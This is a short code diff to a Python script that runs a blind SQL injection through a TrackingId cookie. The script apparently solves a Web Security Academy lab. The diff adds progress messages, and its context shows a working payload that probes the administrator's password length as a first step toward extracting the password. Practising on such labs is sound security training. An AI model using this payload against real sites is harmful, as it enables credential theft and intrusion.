@@ -31,7 +31,9 @@ def pw_length(url, cookies):
         payload = f"' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>{i})='a"
         temp_cookies = cookies.copy()
         temp_cookies['TrackingId'] += payload
+        print(f"[+] Testing pw length = {i}",flush=True, end="\r")
         if not fire_payload(temp_cookies, url):
+            print(f"[+] Testing pw length = {i}")
             return i
 
 
@@ -46,9 +48,10 @@ if __name__ == "__main__":
     s = requests.Session().get(url=url)
     cookies = s.cookies.get_dict()
 
+    print("[*] Web-Security-Academy BlindSqlInjection")
+    print("[+] Blind Sqli Successful!")
     num = pw_length(url, cookies)
     if num:
-        print("[+] Blind Sqli Successful!")
         print(f"[+] Password Length = {num}")
         print("[+] Getting the Password")
         pw_take(url, cookies, num)
